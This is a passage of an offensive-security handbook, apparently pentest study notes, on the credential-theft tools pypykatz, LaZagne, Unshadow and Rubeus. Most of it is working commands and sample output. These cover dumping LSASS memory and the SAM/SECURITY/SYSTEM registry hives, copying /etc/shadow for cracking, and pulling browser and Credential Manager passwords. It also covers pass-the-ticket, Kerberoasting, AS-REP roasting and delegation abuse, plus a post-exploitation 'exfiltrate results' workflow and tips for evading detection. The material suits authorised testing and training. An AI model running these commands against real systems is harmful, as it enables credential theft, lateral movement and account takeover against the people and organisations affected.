<h3 id="dump-cached-domain-credentials"><a class="header" href="#dump-cached-domain-credentials">Dump Cached Domain Credentials</a></h3>
<pre><code class="language-bash">pypykatz registry --security SECURITY --system SYSTEM
</code></pre>
<h3 id="full-registry-extraction"><a class="header" href="#full-registry-extraction">Full Registry Extraction</a></h3>
<pre><code class="language-bash">pypykatz registry --sam SAM --security SECURITY --system SYSTEM
</code></pre>
<hr>
<h2 id="common-workflows-1"><a class="header" href="#common-workflows-1">Common Workflows</a></h2>
<h3 id="workflow-1-offline-lsass-analysis"><a class="header" href="#workflow-1-offline-lsass-analysis">Workflow 1: Offline LSASS Analysis</a></h3>
<pre><code class="language-bash"># On target: Create minidump (various methods)
procdump.exe -ma lsass.exe lsass.dmp
# or: rundll32 comsvcs.dll MiniDump &lt;PID&gt; lsass.dmp full
# or: Task Manager &gt; Details &gt; lsass.exe &gt; Create dump file

# On attacker machine (any OS)
pypykatz lsa minidump lsass.dmp
</code></pre>
<h3 id="workflow-2-credential-manager-extraction"><a class="header" href="#workflow-2-credential-manager-extraction">Workflow 2: Credential Manager Extraction</a></h3>
<pre><code class="language-bash"># 1. Locate credential files
# User credentials: %AppData%\Microsoft\Credentials\
# System credentials: %SystemRoot%\System32\config\systemprofile\...

# 2. Locate masterkey files
# %AppData%\Microsoft\Protect\&lt;SID&gt;\

# 3. Get masterkey from LSASS dump
pypykatz lsa minidump lsass.dmp | grep -i dpapi

# 4. Decrypt credential file
pypykatz dpapi credential &lt;credential_file&gt; &lt;masterkey_guid&gt;:&lt;masterkey_hex&gt;
</code></pre>
<h3 id="workflow-3-offline-registry-attack"><a class="header" href="#workflow-3-offline-registry-attack">Workflow 3: Offline Registry Attack</a></h3>
<pre><code class="language-bash"># On target: Export registry hives (requires admin)
reg save HKLM\SAM SAM
reg save HKLM\SECURITY SECURITY
reg save HKLM\SYSTEM SYSTEM

# On attacker machine
pypykatz registry --sam SAM --security SECURITY --system SYSTEM
</code></pre>
<hr>
<h2 id="output-examples"><a class="header" href="#output-examples">Output Examples</a></h2>
<h3 id="lsass-dump-output"><a class="header" href="#lsass-dump-output">LSASS Dump Output</a></h3>
<pre><code>== LogonSession ==
authentication_id 630472 (99ec8)
session_id 3
username mcharles
domainname SRV01
logon_server SRV01
logon_time 2025-04-27T02:40:32
sid S-1-5-21-1340203682-1669575078-4153855890-1002
        == CREDMAN [00000000] ==
        username mcharles@inlanefreight.local
        domain onedrive.live.com
        password p@ssw0rd123!
</code></pre>
<h3 id="registry-dump-output"><a class="header" href="#registry-dump-output">Registry Dump Output</a></h3>
<pre><code>============== SAM ==============
HBoot Key: a1b2c3d4...
SAM Key: e5f6g7h8...

== User: Administrator ==
RID: 500
NTLM: aad3b435b51404eeaad3b435b51404ee
</code></pre>
<hr>
<h2 id="comparison-with-mimikatz"><a class="header" href="#comparison-with-mimikatz">Comparison with Mimikatz</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>pypykatz</th><th>Mimikatz</th></tr>
</thead>
<tbody>
<tr><td>Platform</td><td>Cross-platform</td><td>Windows only</td></tr>
<tr><td>Live LSASS</td><td>Windows only</td><td>Windows</td></tr>
<tr><td>Offline LSASS</td><td>Any OS</td><td>Windows</td></tr>
<tr><td>Detection</td><td>Lower (Python)</td><td>Higher (well-known)</td></tr>
<tr><td>Dependencies</td><td>Python 3</td><td>None (standalone)</td></tr>
<tr><td>Kerberos attacks</td><td>Limited</td><td>Full support</td></tr>
<tr><td>Token manipulation</td><td>No</td><td>Yes</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-options-2"><a class="header" href="#useful-options-2">Useful Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-o &lt;format&gt;</code></td><td>Output format (json, grep, text)</td></tr>
<tr><td><code>-r</code></td><td>Recursive directory parsing</td></tr>
<tr><td><code>-k</code></td><td>Kerberos ticket extraction</td></tr>
<tr><td><code>--pvk</code></td><td>Domain backup key for masterkey decryption</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="related-tools-3"><a class="header" href="#related-tools-3">Related Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Mimikatz</td><td>Original Windows credential extraction</td></tr>
<tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
<tr><td>SharpDPAPI</td><td>C# DPAPI attacks</td></tr>
<tr><td>DonPAPI</td><td>Remote DPAPI extraction</td></tr>
<tr><td>Impacket</td><td>Python toolkit with secretsdump.py</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="core-takeaways-5"><a class="header" href="#core-takeaways-5">Core Takeaways</a></h2>
<ul>
<li>Use pypykatz for offline analysis of LSASS dumps on non-Windows systems</li>
<li>Supports same DPAPI attacks as Mimikatz for Credential Manager extraction</li>
<li>Lower detection rate compared to native Mimikatz binary</li>
<li>Registry parsing provides SAM, LSA secrets, and cached credentials</li>
<li>JSON output enables easy parsing and automation</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lazagne"><a class="header" href="#lazagne">LaZagne</a></h1>
<p>LaZagne is an open-source application used to retrieve passwords stored on a local computer. It supports multiple platforms (Windows, Linux, macOS) and can extract credentials from a wide variety of software including browsers, email clients, databases, sysadmin tools, and Windows Credential Manager.</p>
<h2 id="key-capabilities-1"><a class="header" href="#key-capabilities-1">Key Capabilities</a></h2>
<ul>
<li><strong>Multi-Platform</strong>: Works on Windows, Linux, and macOS</li>
<li><strong>Browser Credentials</strong>: Chrome, Firefox, Edge, Opera, IE, and more</li>
<li><strong>Windows Credentials</strong>: Credential Manager, DPAPI-protected secrets</li>
<li><strong>Application Passwords</strong>: Email clients, databases, FTP clients, WiFi, etc.</li>
<li><strong>Memory Extraction</strong>: Some modules extract from process memory</li>
</ul>
<hr>
<h2 id="installation-7"><a class="header" href="#installation-7">Installation</a></h2>
<h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
<pre><code class="language-powershell"># Download standalone executable
https://github.com/AlessandroZ/LaZagne/releases

# Or run from Python
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne
pip install -r requirements.txt
python laZagne.py all
</code></pre>
<h3 id="linuxmacos"><a class="header" href="#linuxmacos">Linux/macOS</a></h3>
<pre><code class="language-bash">git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne
pip3 install -r requirements.txt
python3 laZagne.py all
</code></pre>
<hr>
<h2 id="basic-usage-4"><a class="header" href="#basic-usage-4">Basic Usage</a></h2>
<h3 id="extract-all-credentials"><a class="header" href="#extract-all-credentials">Extract All Credentials</a></h3>
<pre><code class="language-bash"># Windows
laZagne.exe all

# Linux/macOS
python3 laZagne.py all
</code></pre>
<h3 id="quiet-mode-passwords-only"><a class="header" href="#quiet-mode-passwords-only">Quiet Mode (Passwords Only)</a></h3>
<pre><code class="language-bash">laZagne.exe all -quiet
</code></pre>
<h3 id="write-output-to-file"><a class="header" href="#write-output-to-file">Write Output to File</a></h3>
<pre><code class="language-bash">laZagne.exe all -oN          # Normal text output
laZagne.exe all -oJ          # JSON output
laZagne.exe all -oA          # All formats
</code></pre>
<hr>
<h2 id="modules-2"><a class="header" href="#modules-2">Modules</a></h2>
<h3 id="list-available-modules"><a class="header" href="#list-available-modules">List Available Modules</a></h3>
<pre><code class="language-bash">laZagne.exe -h
</code></pre>
<h3 id="module-categories-1"><a class="header" href="#module-categories-1">Module Categories</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Category</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>browsers</code></td><td>Web browser credentials</td></tr>
<tr><td><code>chats</code></td><td>Messaging applications</td></tr>
<tr><td><code>databases</code></td><td>Database clients</td></tr>
<tr><td><code>games</code></td><td>Gaming platforms</td></tr>
<tr><td><code>git</code></td><td>Git credentials</td></tr>
<tr><td><code>mails</code></td><td>Email clients</td></tr>
<tr><td><code>memory</code></td><td>Process memory extraction</td></tr>
<tr><td><code>multimedia</code></td><td>Media applications</td></tr>
<tr><td><code>php</code></td><td>PHP-related tools</td></tr>
<tr><td><code>svn</code></td><td>SVN clients</td></tr>
<tr><td><code>sysadmin</code></td><td>System administration tools</td></tr>
<tr><td><code>wifi</code></td><td>WiFi passwords</td></tr>
<tr><td><code>windows</code></td><td>Windows Credential Manager, DPAPI</td></tr>
</tbody>
</table>
</div>
<h3 id="run-specific-module-category"><a class="header" href="#run-specific-module-category">Run Specific Module Category</a></h3>
<pre><code class="language-bash">laZagne.exe browsers
laZagne.exe windows
laZagne.exe sysadmin
laZagne.exe wifi
</code></pre>
<hr>
<h2 id="windows-credential-manager-extraction"><a class="header" href="#windows-credential-manager-extraction">Windows Credential Manager Extraction</a></h2>
<h3 id="extract-credential-manager-secrets"><a class="header" href="#extract-credential-manager-secrets">Extract Credential Manager Secrets</a></h3>
<pre><code class="language-bash">laZagne.exe windows
</code></pre>
<h3 id="windows-module-components"><a class="header" href="#windows-module-components">Windows Module Components</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>credman</code></td><td>Windows Credential Manager</td></tr>
<tr><td><code>vault</code></td><td>Windows Vault</td></tr>
<tr><td><code>dpapi</code></td><td>DPAPI-protected secrets</td></tr>
<tr><td><code>autologon</code></td><td>Auto-logon credentials</td></tr>
<tr><td><code>cachedump</code></td><td>Cached domain credentials</td></tr>
<tr><td><code>hashdump</code></td><td>Local SAM hashes (requires SYSTEM)</td></tr>
<tr><td><code>lsa_secrets</code></td><td>LSA secrets (requires SYSTEM)</td></tr>
</tbody>
</table>
</div>
<h3 id="run-specific-windows-module"><a class="header" href="#run-specific-windows-module">Run Specific Windows Module</a></h3>
<pre><code class="language-bash">laZagne.exe windows -m credman
laZagne.exe windows -m vault
laZagne.exe windows -m dpapi
</code></pre>
<hr>
<h2 id="browser-credential-extraction"><a class="header" href="#browser-credential-extraction">Browser Credential Extraction</a></h2>
<h3 id="all-browsers-1"><a class="header" href="#all-browsers-1">All Browsers</a></h3>
<pre><code class="language-bash">laZagne.exe browsers
</code></pre>
<h3 id="supported-browsers"><a class="header" href="#supported-browsers">Supported Browsers</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Browser</th><th>Module</th></tr>
</thead>
<tbody>
<tr><td>Chrome</td><td><code>chrome</code></td></tr>
<tr><td>Firefox</td><td><code>firefox</code></td></tr>
<tr><td>Edge (Chromium)</td><td><code>chromiumedge</code></td></tr>
<tr><td>Opera</td><td><code>opera</code></td></tr>
<tr><td>Internet Explorer</td><td><code>ie</code></td></tr>
<tr><td>Brave</td><td><code>brave</code></td></tr>
<tr><td>Vivaldi</td><td><code>vivaldi</code></td></tr>
</tbody>
</table>
</div>
<h3 id="run-specific-browser-module"><a class="header" href="#run-specific-browser-module">Run Specific Browser Module</a></h3>
<pre><code class="language-bash">laZagne.exe browsers -m chrome
laZagne.exe browsers -m firefox
</code></pre>
<hr>
<h2 id="advanced-options-2"><a class="header" href="#advanced-options-2">Advanced Options</a></h2>
<h3 id="use-specific-user-profile"><a class="header" href="#use-specific-user-profile">Use Specific User Profile</a></h3>
<pre><code class="language-bash">laZagne.exe all -user &lt;username&gt;
</code></pre>
<h3 id="specify-password-for-dpapi-decryption"><a class="header" href="#specify-password-for-dpapi-decryption">Specify Password for DPAPI Decryption</a></h3>
<pre><code class="language-bash">laZagne.exe all -password &lt;user_password&gt;
</code></pre>
<h3 id="extract-from-offline-hives"><a class="header" href="#extract-from-offline-hives">Extract from Offline Hives</a></h3>
<pre><code class="language-bash"># Requires SAM, SECURITY, SYSTEM hives
laZagne.exe all -local -sam SAM -security SECURITY -system SYSTEM
</code></pre>
<h3 id="verbose-output-4"><a class="header" href="#verbose-output-4">Verbose Output</a></h3>
<pre><code class="language-bash">laZagne.exe all -v
laZagne.exe all -vv   # Extra verbose
</code></pre>
<hr>
<h2 id="output-formats-2"><a class="header" href="#output-formats-2">Output Formats</a></h2>
<h3 id="normal-text-output"><a class="header" href="#normal-text-output">Normal Text Output</a></h3>
<pre><code class="language-bash">laZagne.exe all -oN
# Creates: results/credentials.txt
</code></pre>
<h3 id="json-output-1"><a class="header" href="#json-output-1">JSON Output</a></h3>
<pre><code class="language-bash">laZagne.exe all -oJ
# Creates: results/credentials.json
</code></pre>
<h3 id="all-formats"><a class="header" href="#all-formats">All Formats</a></h3>
<pre><code class="language-bash">laZagne.exe all -oA
# Creates both text and JSON files
</code></pre>
<h3 id="specify-output-directory"><a class="header" href="#specify-output-directory">Specify Output Directory</a></h3>
<pre><code class="language-bash">laZagne.exe all -oN -output /path/to/output/
</code></pre>
<hr>
<h2 id="example-output"><a class="header" href="#example-output">Example Output</a></h2>
<h3 id="credential-manager-output"><a class="header" href="#credential-manager-output">Credential Manager Output</a></h3>
<pre><code>|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! MUSIC AGAIN !                           |
|                                                                    |
|====================================================================|

------------------- Credman passwords -----------------

[+] Password found !!!
URL: Domain:interactive=SRV01\mcharles
Login: SRV01\mcharles
Password: P@ssw0rd123!

[+] Password found !!!
URL: https://github.com
Login: admin@company.com
Password: github_token_123

[+] 2 passwords have been found.
</code></pre>
<hr>
<h2 id="linux-specific-modules"><a class="header" href="#linux-specific-modules">Linux-Specific Modules</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>env</code></td><td>Environment variables</td></tr>
<tr><td><code>memory</code></td><td>Process memory</td></tr>
<tr><td><code>mimipy</code></td><td>Similar to Mimikatz</td></tr>
<tr><td><code>docker</code></td><td>Docker credentials</td></tr>
<tr><td><code>aws</code></td><td>AWS credentials</td></tr>
<tr><td><code>gcloud</code></td><td>Google Cloud credentials</td></tr>
</tbody>
</table>
</div>
<h3 id="run-linux-specific"><a class="header" href="#run-linux-specific">Run Linux-Specific</a></h3>
<pre><code class="language-bash">python3 laZagne.py all
python3 laZagne.py sysadmin
python3 laZagne.py memory
</code></pre>
<hr>
<h2 id="common-workflows-2"><a class="header" href="#common-workflows-2">Common Workflows</a></h2>
<h3 id="workflow-1-quick-credential-dump"><a class="header" href="#workflow-1-quick-credential-dump">Workflow 1: Quick Credential Dump</a></h3>
<pre><code class="language-bash"># Dump all credentials quietly
laZagne.exe all -quiet

# Save to JSON for parsing
laZagne.exe all -oJ -quiet
</code></pre>
<h3 id="workflow-2-targeted-windows-credential-manager"><a class="header" href="#workflow-2-targeted-windows-credential-manager">Workflow 2: Targeted Windows Credential Manager</a></h3>
<pre><code class="language-bash"># Extract Credential Manager and Vault
laZagne.exe windows -m credman
laZagne.exe windows -m vault

# With user password for DPAPI
laZagne.exe windows -password 'UserPassword123'
</code></pre>
<h3 id="workflow-3-post-exploitation-script"><a class="header" href="#workflow-3-post-exploitation-script">Workflow 3: Post-Exploitation Script</a></h3>
<pre><code class="language-bash"># On Windows target
laZagne.exe all -oJ -output C:\Temp\ -quiet

# Exfiltrate results
type C:\Temp\credentials.json
</code></pre>
<hr>
<h2 id="comparison-with-other-tools"><a class="header" href="#comparison-with-other-tools">Comparison with Other Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>LaZagne</th><th>Mimikatz</th><th>pypykatz</th></tr>
</thead>
<tbody>
<tr><td>Platform</td><td>Multi-platform</td><td>Windows</td><td>Multi-platform</td></tr>
<tr><td>Browser creds</td><td>Yes</td><td>No</td><td>No</td></tr>
<tr><td>Credential Manager</td><td>Yes</td><td>Yes</td><td>Yes</td></tr>
<tr><td>LSASS extraction</td><td>Limited</td><td>Full</td><td>Full</td></tr>
<tr><td>Application creds</td><td>Extensive</td><td>Limited</td><td>No</td></tr>
<tr><td>Kerberos attacks</td><td>No</td><td>Yes</td><td>Limited</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="evasion-and-detection"><a class="header" href="#evasion-and-detection">Evasion and Detection</a></h2>
<h3 id="detection-points"><a class="header" href="#detection-points">Detection Points</a></h3>
<ul>
<li>Process creation of LaZagne binary</li>
<li>Access to browser profile directories</li>
<li>DPAPI calls</li>
<li>Access to Credential Manager stores</li>
</ul>
<h3 id="evasion-tips-1"><a class="header" href="#evasion-tips-1">Evasion Tips</a></h3>
<ul>
<li>Compile from source with modifications</li>
<li>Use Python script instead of binary</li>
<li>Run individual modules to reduce footprint</li>
<li>Use <code>-quiet</code> flag to minimize console output</li>
</ul>
<hr>
<h2 id="related-tools-4"><a class="header" href="#related-tools-4">Related Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Mimikatz</td><td>Windows credential extraction from memory</td></tr>
<tr><td>pypykatz</td><td>Python Mimikatz implementation</td></tr>
<tr><td>SharpDPAPI</td><td>C# DPAPI attacks</td></tr>
<tr><td>CredNinja</td><td>Credential testing tool</td></tr>
<tr><td>BrowserGather</td><td>Browser credential extraction</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="core-takeaways-6"><a class="header" href="#core-takeaways-6">Core Takeaways</a></h2>
<ul>
<li>LaZagne extracts credentials from many sources Mimikatz doesn‚Äôt cover (browsers, applications)</li>
<li>Works cross-platform (Windows, Linux, macOS)</li>
<li>Use <code>-quiet</code> and <code>-oJ</code> for clean, parseable output</li>
<li>Windows module specifically targets Credential Manager and DPAPI</li>
<li>Lower detection rate for application credentials vs LSASS-based tools</li>
<li>Combine with Mimikatz/pypykatz for comprehensive credential extraction</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="unshadow"><a class="header" href="#unshadow">Unshadow</a></h1>
<p>Unshadow is a utility included with John the Ripper that combines the <code>/etc/passwd</code> and <code>/etc/shadow</code> files into a single file format suitable for password cracking. This combined format is what John the Ripper‚Äôs single crack mode was specifically designed for.</p>
<hr>
<h2 id="purpose"><a class="header" href="#purpose">Purpose</a></h2>
<p>On modern Linux systems, user information is split between two files:</p>
<ul>
<li><code>/etc/passwd</code> - Contains user account info (username, UID, GID, GECOS, home, shell) - world-readable</li>
<li><code>/etc/shadow</code> - Contains password hashes - readable only by root</li>
</ul>
<p>Unshadow merges these files so that password crackers have access to both the hash and the user context (username, real name from GECOS field) in a single file.</p>
<hr>
<h2 id="installation-8"><a class="header" href="#installation-8">Installation</a></h2>
<p>Unshadow comes bundled with John the Ripper. On Debian-based systems:</p>
<pre><code class="language-sh">sudo apt-get install john
</code></pre>
<p>Verify installation:</p>
<pre><code class="language-sh">which unshadow
</code></pre>
<hr>
<h2 id="basic-syntax-8"><a class="header" href="#basic-syntax-8">Basic Syntax</a></h2>
<pre><code class="language-sh">unshadow &lt;passwd_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
</code></pre>
<hr>
<h2 id="usage"><a class="header" href="#usage">Usage</a></h2>
<h3 id="step-1-copy-system-files"><a class="header" href="#step-1-copy-system-files">Step 1: Copy System Files</a></h3>
<p>Always work with copies to avoid modifying system files:</p>
<pre><code class="language-sh">sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
</code></pre>
<h3 id="step-2-combine-files"><a class="header" href="#step-2-combine-files">Step 2: Combine Files</a></h3>
<pre><code class="language-sh">unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
</code></pre>
<h3 id="step-3-crack-with-john-the-ripper"><a class="header" href="#step-3-crack-with-john-the-ripper">Step 3: Crack with John the Ripper</a></h3>
<p><strong>Single Crack Mode (Recommended for Linux credentials):</strong></p>
<p>Single crack mode uses the username, home directory, and GECOS field to generate password candidates. This is highly effective because users often base passwords on their name or username.</p>
<pre><code class="language-sh">john --single /tmp/unshadowed.hashes
</code></pre>
<p><strong>Wordlist Mode:</strong></p>
<pre><code class="language-sh">john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed.hashes
</code></pre>
<p><strong>Show Cracked Passwords:</strong></p>
<pre><code class="language-sh">john --show /tmp/unshadowed.hashes
</code></pre>
<h3 id="alternative-crack-with-hashcat"><a class="header" href="#alternative-crack-with-hashcat">Alternative: Crack with hashcat</a></h3>
<pre><code class="language-sh">hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o cracked.txt
</code></pre>
<hr>
<h2 id="output-format-1"><a class="header" href="#output-format-1">Output Format</a></h2>
<p>The unshadowed file combines fields from both source files:</p>
<p><strong>Input (passwd):</strong></p>
<pre><code>htb-student:x:1000:1000:HTB Student,,,:/home/htb-student:/bin/bash
</code></pre>
<p><strong>Input (shadow):</strong></p>
<pre><code>htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
</code></pre>
<p><strong>Output (unshadowed):</strong></p>
<pre><code>htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:1000:1000:HTB Student,,,:/home/htb-student:/bin/bash
</code></pre>
<hr>
<h2 id="why-use-unshadow"><a class="header" href="#why-use-unshadow">Why Use Unshadow?</a></h2>
<ol>
<li>
<p><strong>Context for Single Crack Mode</strong> - John‚Äôs single crack mode leverages the username and GECOS data to generate intelligent password guesses (e.g., user ‚ÄúBob Smith‚Äù might use ‚ÄúSmith1‚Äù as password)</p>
</li>
<li>
<p><strong>Complete User Context</strong> - Having the full passwd line helps identify which accounts are worth targeting (system accounts vs. real users)</p>
</li>
<li>
<p><strong>Standard Format</strong> - Creates the classic Unix password file format that many tools expect</p>
</li>
</ol>
<hr>
<h2 id="hash-algorithm-identification"><a class="header" href="#hash-algorithm-identification">Hash Algorithm Identification</a></h2>
<p>The password hash in the unshadowed file indicates the algorithm:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Prefix</th><th>Algorithm</th><th>Hashcat Mode</th></tr>
</thead>
<tbody>
<tr><td>$1$</td><td>MD5crypt</td><td>500</td></tr>
<tr><td>$5$</td><td>SHA-256crypt</td><td>7400</td></tr>
<tr><td>$6$</td><td>SHA-512crypt</td><td>1800</td></tr>
<tr><td>$y$</td><td>Yescrypt</td><td>-</td></tr>
<tr><td>$2a$</td><td>bcrypt</td><td>3200</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="security-notes"><a class="header" href="#security-notes">Security Notes</a></h2>
<ul>
<li>Requires root access to read <code>/etc/shadow</code></li>
<li>Work with file copies, never modify originals</li>
<li>Delete unshadowed files after use to avoid credential exposure</li>
<li>MD5crypt ($1$) hashes are significantly faster to crack than modern algorithms</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rubeus"><a class="header" href="#rubeus">Rubeus</a></h1>
<p>Rubeus is a C# toolkit for Kerberos interaction and abuse, developed by Will Schroeder (harmj0y) as part of the GhostPack project. It provides extensive functionality for Kerberos ticket manipulation, credential extraction, and various Kerberos-based attacks.</p>
<h2 id="key-capabilities-2"><a class="header" href="#key-capabilities-2">Key Capabilities</a></h2>
<ul>
<li><strong>Ticket Operations</strong>: Dump, request, renew, describe, and import Kerberos tickets</li>
<li><strong>Pass the Ticket</strong>: Import tickets into the current session for lateral movement</li>
<li><strong>Pass the Key / OverPass the Hash</strong>: Request TGTs using password hashes</li>
<li><strong>Kerberoasting</strong>: Extract service ticket hashes for offline cracking</li>
<li><strong>AS-REP Roasting</strong>: Extract hashes from accounts without pre-authentication</li>
<li><strong>Constrained Delegation Abuse</strong>: S4U2Self and S4U2Proxy attacks</li>
<li><strong>Ticket Forging</strong>: Create Golden and Silver tickets (with appropriate hashes)</li>
</ul>
<hr>
<h2 id="installation-9"><a class="header" href="#installation-9">Installation</a></h2>
<p>Rubeus is not installed via package managers. Compile from source or download pre-compiled:</p>
<pre><code>https://github.com/GhostPack/Rubeus
</code></pre>
<p>Compile with Visual Studio or use pre-compiled versions from various pentesting resources.</p>
<hr>
<h2 id="basic-usage-5"><a class="header" href="#basic-usage-5">Basic Usage</a></h2>
<h3 id="dump-all-tickets-1"><a class="header" href="#dump-all-tickets-1">Dump All Tickets</a></h3>
<pre><code class="language-cmd">Rubeus.exe dump /nowrap
</code></pre>
<p>The <code>/nowrap</code> option prevents line wrapping in Base64 output for easier copy-paste.</p>
<h3 id="triage-list-current-tickets"><a class="header" href="#triage-list-current-tickets">Triage (List Current Tickets)</a></h3>
<pre><code class="language-cmd">Rubeus.exe triage
</code></pre>
<h3 id="request-a-tgt"><a class="header" href="#request-a-tgt">Request a TGT</a></h3>
<p>Using NTLM hash (RC4):</p>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /rc4:64F12CDDAA88057E06A81B54E73B949B /nowrap
</code></pre>
<p>Using AES256 hash:</p>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
</code></pre>
<p>Using password:</p>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /password:Password123! /nowrap
</code></pre>
<h3 id="request-tgt-and-import-into-session"><a class="header" href="#request-tgt-and-import-into-session">Request TGT and Import into Session</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:&lt;hash&gt; /ptt
</code></pre>
<hr>
<h2 id="pass-the-ticket-ptt-1"><a class="header" href="#pass-the-ticket-ptt-1">Pass the Ticket (PtT)</a></h2>
<h3 id="import-kirbi-file-1"><a class="header" href="#import-kirbi-file-1">Import .kirbi File</a></h3>
<pre><code class="language-cmd">Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-john@krbtgt-domain.local.kirbi
</code></pre>
<h3 id="import-base64-ticket-1"><a class="header" href="#import-base64-ticket-1">Import Base64 Ticket</a></h3>
<pre><code class="language-cmd">Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEoj...
</code></pre>
<p>After importing, access resources in the user‚Äôs context:</p>
<pre><code class="language-cmd">dir \\DC01.domain.local\c$
</code></pre>
<hr>
<h2 id="sacrificial-process-createnetonly-1"><a class="header" href="#sacrificial-process-createnetonly-1">Sacrificial Process (createnetonly)</a></h2>
<p>Create a new logon session to avoid overwriting existing tickets:</p>
<pre><code class="language-cmd">Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
</code></pre>
<p>In the spawned window, request and import a ticket:</p>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:&lt;hash&gt; /ptt
</code></pre>
<p>Use PowerShell remoting to access the target:</p>
<pre><code class="language-powershell">Enter-PSSession -ComputerName DC01
</code></pre>
<hr>
<h2 id="kerberoasting-1"><a class="header" href="#kerberoasting-1">Kerberoasting</a></h2>
<h3 id="extract-all-kerberoastable-hashes"><a class="header" href="#extract-all-kerberoastable-hashes">Extract All Kerberoastable Hashes</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /nowrap
</code></pre>
<h3 id="specific-user"><a class="header" href="#specific-user">Specific User</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /user:svc_mssql /nowrap
</code></pre>
<h3 id="hashcat-compatible-format"><a class="header" href="#hashcat-compatible-format">Hashcat-Compatible Format</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt
</code></pre>
<h3 id="request-aes-tickets-harder-to-crack"><a class="header" href="#request-aes-tickets-harder-to-crack">Request AES Tickets (Harder to Crack)</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /aes /nowrap
</code></pre>
<p>Crack with Hashcat:</p>
<pre><code class="language-bash">hashcat -m 13100 kerberoast.txt wordlist.txt
</code></pre>
<hr>
<h2 id="as-rep-roasting-1"><a class="header" href="#as-rep-roasting-1">AS-REP Roasting</a></h2>
<p>Target accounts with ‚ÄúDo not require Kerberos preauthentication‚Äù enabled:</p>
<h3 id="extract-all-as-rep-roastable-hashes"><a class="header" href="#extract-all-as-rep-roastable-hashes">Extract All AS-REP Roastable Hashes</a></h3>
<pre><code class="language-cmd">Rubeus.exe asreproast /nowrap
</code></pre>
<h3 id="specific-user-1"><a class="header" href="#specific-user-1">Specific User</a></h3>
<pre><code class="language-cmd">Rubeus.exe asreproast /user:svc_backup /nowrap
</code></pre>
<h3 id="hashcat-format"><a class="header" href="#hashcat-format">Hashcat Format</a></h3>
<pre><code class="language-cmd">Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
</code></pre>
<p>Crack with Hashcat:</p>
<pre><code class="language-bash">hashcat -m 18200 asrep.txt wordlist.txt
</code></pre>
<hr>
<h2 id="request-service-tickets-asktgs-1"><a class="header" href="#request-service-tickets-asktgs-1">Request Service Tickets (asktgs)</a></h2>
<p>Request a TGS using an existing TGT:</p>
<pre><code class="language-cmd">Rubeus.exe asktgs /ticket:&lt;tgt_base64&gt; /service:cifs/fileserver.domain.local /nowrap
</code></pre>
<p>Request and import:</p>
<pre><code class="language-cmd">Rubeus.exe asktgs /ticket:&lt;tgt_base64&gt; /service:cifs/fileserver.domain.local /ptt
</code></pre>
<hr>
<h2 id="constrained-delegation-abuse-s4u"><a class="header" href="#constrained-delegation-abuse-s4u">Constrained Delegation Abuse (S4U)</a></h2>
<p>When a service account has constrained delegation configured:</p>
<pre><code class="language-cmd">Rubeus.exe s4u /user:svc_sql /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /ptt
</code></pre>
<p>With alternate service:</p>
<pre><code class="language-cmd">Rubeus.exe s4u /user:svc_sql /aes256:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /altservice:http /ptt
</code></pre>
<hr>
